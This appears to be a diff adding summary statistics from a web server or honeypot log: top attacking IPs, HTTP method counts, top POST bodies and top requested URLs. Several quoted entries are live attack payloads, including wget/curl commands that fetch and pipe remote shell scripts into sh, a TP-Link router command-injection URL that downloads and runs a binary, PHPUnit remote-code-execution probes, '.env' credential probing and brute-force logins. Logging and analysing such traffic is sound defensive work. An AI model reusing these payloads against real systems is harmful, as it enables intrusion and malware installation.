@@ -1,0 +1,38 @@
+Total IP counts: 14989
+Unique IPs: 1627
+Top 10 IPs: [
+    ('173.249.5.74', 4276), 
+    ('41.216.183.12', 1304), 
+    ('94.156.66.181', 1230), 
+    ('146.19.24.28', 335), 
+    ('185.224.128.43', 283), 
+    ('15.204.180.16', 251), 
+    ('80.94.92.60', 216), 
+    ('87.121.69.52', 185), 
+    ('154.82.84.7', 108), 
+    ('80.251.153.235', 105)
+]
+HTTP methods usage: Counter({'GET': 25860, 'POST': 2828, 'PUT': 222, 'HEAD': 74, 'OPTIONS': 24, 'DELETE': 14, 'PATCH': 10})
+Top 10 POST data segments: [
+    ('<?php echo(md5("Hello PHPUnit"));', 1015), 
+    ('', 110), ('0x%5B%5D=androxgh0st', 85), 
+    ('queryString=aaaa\\\\u0027%2b#{16*8787}%2b\\\\u0027bbb', 39), 
+    ('wget http://193.222.96.163/ap.sh -O- | sh -s apache.selfrep || curl http://193.222.96.163/ap.sh | sh -s apache.selfrep', 28), 
+    ('username=admin&psd=Feefifofum', 27), 
+    ('<?php echo md5(phpunit_rce);?>', 18), 
+    ('wget http://94.156.79.60/ap.sh -O- | sh -s apache.selfrep || curl http://94.156.79.60/ap.sh | sh -s apache.selfrep', 18), 
+    ('log=admin&pwd=admin123651651651654', 18), 
+    ('wget http://185.216.70.138/apache.sh -O- | sh; curl http://185.216.70.138/apache.sh | sh', 13)
+]
+Top 10 URLs: [
+    ('/', 6392), 
+    ('/favicon.ico', 736), 
+    ('google.com:443', 526), 
+    ('/.env', 410), 
+    ('/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk)', 332), 
+    ('*', 204), 
+    ('/phpMyAdmin/index.php?token=6cb962a09d5e109f33e841a132940a27', 202), 
+    ('/SDK/webLanguage', 190), 
+    ('www.google.com:443', 160), 
+    ('/geoserver/web/', 118)
+]
